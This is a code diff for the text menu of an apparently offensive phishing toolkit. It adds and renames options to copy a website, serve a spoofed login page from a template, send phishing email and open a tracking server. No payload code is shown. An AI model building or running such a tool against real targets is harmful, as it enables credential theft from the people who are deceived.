@@ -22,61 +22,83 @@ tracking_thread.start()
 
 Banner()
 
-while True:
+while(True):
+    
+    
     print("press 1 to scrape a website")
     print("press 2 to spoof a login page")
-    print("press 3 to send a phishing email")
+    print("press 3 to go to phishing email")
     print("press 4 to go to tracking server")
-    print(":", end="")
+    print(":",end="")
     dec = int(input())
-
+    
     match dec:
         case 1:
-            while True:
+            while (True):
                 print("press 1 to fetch a url")
                 print("press 2 to run the website locally")
-                print("press 3 to change the file of the html (default = example.html)")
-                print("press 4 to go back")
-                print(":", end="")
+                print("press 3 to change your website dir (default template Login_v4)")
+                print("press 4 to change the base HTML")
+                print("press 5 to go back")
+                print(":",end="")
                 dec2 = int(input())
                 match dec2:
                     case 1:
                         print("please enter the full url")
+                        print(":",end="")
                         url = input()
-                        WebsiteCopier.fetch(url)
+                        WebsiteCopier.fetchUrl(url)
                         break
                     case 2:
                         print("starting website locally")
                         WebsiteCopier.run()
                         break
+                        
                     case 3:
                         print("enter the file Full path/name")
+                        print(":",end="")
                         inp = input()
-                        WebsiteCopier.changefile(inp)
+                        WebsiteCopier.changewebsiteDir(inp)
                         break
                     case 4:
+                        print("enter the file name of html")
+                        print(":",end="")
+                        inp = input()
+                        WebsiteCopier.changewebsiteBase(inp)
+                        break
+                    case 5:
                         break
                     case _:
                         print("invalid input")
+                
+            
+            
         case 2:
             print("press 1 to change the html to a file")
             print("press 2 to run the website locally")
-            print("press 3 to reset the html")
+            print("press 3 to change your website dir (default template Login_v4)")
             print("press 4 to go back")
-            print(":", end="")
+            print(":",end="")
             dec2 = int(input())
             match dec2:
                 case 1:
+                    print(":",end="")
                     inp = input()
-                    WebsiteSpoofer.ChangeHTML(inp)
+                    WebsiteSpoofer.changewebsiteBase(inp)
                     break
+                
                 case 2:
                     print("starting website locally")
+                    print(":",end="")
                     WebsiteSpoofer.run()
                     break
+                
                 case 3:
-                    WebsiteSpoofer.ResetHTML()
-                    print("html reset to default")
+                    print("enter the file Full path/name")
+                    print(":",end="")
+                    inp = input()
+                    WebsiteSpoofer.changewebsiteDir(inp)
+                    
                     break
                 case 4:
                     break
